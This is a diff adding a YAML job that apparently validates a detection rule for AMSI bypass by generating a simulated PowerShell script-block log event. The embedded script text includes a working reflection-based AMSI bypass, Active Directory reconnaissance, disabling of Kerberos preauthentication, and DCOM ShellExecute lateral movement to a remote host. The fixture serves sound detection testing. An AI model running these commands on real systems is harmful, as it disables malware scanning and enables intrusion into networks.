@@ -1,0 +1,42 @@
+type: job
+name: Unloading AMSI via Reflection
+detection:
+  source: escu
+  name: "ESCU - Unloading AMSI via Reflection - Rule"
+  id: a21e3484-c94d-11eb-b55b-acde48001122
+description: |
+  Validates detection of an AMSI bypass through PowerShell reflection:
+  PowerShell/Operational EID 4104 (Script Block Logging) records a block,
+  read from a script file, that among a run of local and Active Directory
+  reconnaissance commands uses [Ref].Assembly.GetType to reach the
+  System.Management.Automation.AmsiUtils class and sets its private static
+  amsiInitFailed field to true.
+
+mitre:
+  tactics: [execution, defense-impairment]
+  techniques: [T1059.001, T1685]
+
+state:
+  domain_short:       CORP
+  domain_tld:         local
+  domain_short_lower: fn.lower(ref.domain_short)
+  domain_fqdn:        "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:           gen.hostname(class=windows-server, domain=ref.domain_fqdn)
+  level:              3
+
+workloads:
+  - scenario: scenarios/windows/powershell/script-block/script-block-logged
+    bindings:
+      domain_short:      ref.domain_short
+      domain_tld:        ref.domain_tld
+      computer:          ref.computer
+      level:             ref.level
+      provider_guid:     "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"
+      script_path:       "C:\\Temp\\simulate.ps1"
+      script_block_text: "Get-LocalUser | Out-File -FilePath .\\localUser.txt; Get-ADUserResultantPasswordPolicy -Identity Administrator | Out-File -FilePath .\\PasswordPolicy.txt; Get-ADuser Guest | Set-ADAccountControl -DoesNotRequirePreAuth:$true; Get-ADDefaultDomainPasswordPolicy | Out-File -FilePath .\\ADDefaultPassPolicy.txt;Enter-PSSession -ComputerName ar-win-dc-default-attack-range;[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt;$env:UserName | Out-File -FilePath .\\CurrentactiveUser.txt -Append;[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt;get-wmiobject win32_group | Out-File -FilePath .\\DomainGroup.txt;$o= [activator]::CreateInstance([type]::GetTypeFromCLSID(\"9BA05972-F6A8-11CF-A442-00A0C90A8F39\")); $item = $o.Item() ; $item.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0);[activator]::CreateInstance([type]::GetTypeFromCLSID(\"C08AFD90-F2A1-11D1-8455-00A0C91F3880\",\"10.0.1.16\")).Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0); Get-AdComputer -Filter * | Out-File -FilePath .\\AdComputer.txt;[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);Invoke-Command -ComputerName ar-win-dc-default-attack-range -ScriptBlock {ipconfig};Get-WmiObject -Query â€œSELECT * FROM AntiSpywareProductâ€\x9d;Get-WmiObject -Query â€œSELECT * FROM AntiVirusProductâ€\x9d;get-wmiobject Win32_ComputerSystemProduct"
+    expectation:
+      expected: alert
+      summary: "PowerShell sets AmsiUtils amsiInitFailed to true through reflection"
+      mitre:
+        tactics: [execution, defense-impairment]
+        techniques: [T1059.001, T1685]
